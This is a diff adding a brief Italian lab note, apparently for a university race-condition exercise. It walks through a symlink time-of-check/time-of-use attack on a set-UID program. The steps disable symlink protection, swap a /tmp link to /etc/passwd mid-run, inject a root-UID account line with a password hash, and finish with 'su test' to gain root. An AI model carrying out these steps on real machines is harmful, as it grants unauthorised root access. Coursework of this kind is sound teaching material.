@@ -1,0 +1,32 @@
+## Before to launch the attack
+sudo sysctl -w fs.protected_symlinks=0
+
+
+
+Task  2.A 
+
+1. touch /tmp/paperino
+
+
+## La system call access andrà a buon fine perché paperino 
+## è stato creato dall'utente seed (controlla il real UID).
+2. ln -sf /tmp/paperino /tmp/XYZ
+
+
+3. Avviare il programma (con sleep 10) vulp_sleep
+
+
+4. fornire il seguente input  
+test:U6aMy0wojraho:0:0:test:/root:/bin/bash
+
+
+mentre il programma set-UID è in sleep, andare a cambiare il link simbolico:
+5. ln -sf /etc/passwd /tmp/XYZ
+
+
+Una volta che il programma vulnerabile termina, andiamo a controllare il file /etc/passwd.
+6. su test
+
+
+7. cat /etc/passwd
+
